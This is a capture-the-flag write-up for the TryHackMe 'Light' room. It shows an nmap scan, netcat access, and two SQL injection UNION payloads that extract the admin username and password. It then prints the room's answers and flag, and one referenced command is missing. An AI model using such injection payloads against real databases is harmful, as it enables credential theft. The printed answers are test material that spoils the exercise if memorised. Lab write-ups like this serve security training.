# Introduction

## Task 1: Welcome

I am working on a database application called Light! Would you like to try it out?  
If so, the application is running on port 1337. You can connect to it using `nc 10.10.133.190 1337`.  
You can use the username `smokey` in order to get started.

**Note:** Please allow the service 2–3 minutes to fully start before connecting to it.

[Link to start solving the room](https://tryhackme.com/r/room/lightroom)

---

# Explanation

Before finding the admin username, we need to identify the open ports on the system associated with the given IP address. By performing an Nmap scan using the command:

```bash
sudo nmap -sC -sV -Pn 10.10.106.226
```

I discovered an open port on SSH within the first 1000 popular ports. Other than that, there is an open port on 1337.

Now, we need to determine what is happening within the database by interacting with it using the Netcat command mentioned in the room.

When we enter the valid username, it returns the password associated with the username.

To find the admin username, we have to use the SQL injection technique here. Use the payload below to retrieve the username:

```sql
smokey’ Union Select username FROM admintable WHERE username like ‘%
```

**What is the admin username?**  
`TryHackMeAdmin`

To find the password for this username, you have to use the following payload:

```sql
smokey’ Union Select password FROM admintable WHERE username=’TryHackMeAdmin
```

**What is the password to the username mentioned in question 1?**  
`mamZtAuMlrsEy5bp6q17`

To find the flag, we need to determine if the SSH access for this username and password is not working. I discovered that there are two usernames stored in the `admintable`. This can be verified using the following command:

It reveals that there are two usernames and one of them is `flag`. Our task is to find the password associated with the `flag` username, which will likely be the flag for the CTF.

**What is the flag?**  
`THM{SQLit3_InJ3cTion_is_SimplE_nO?}`
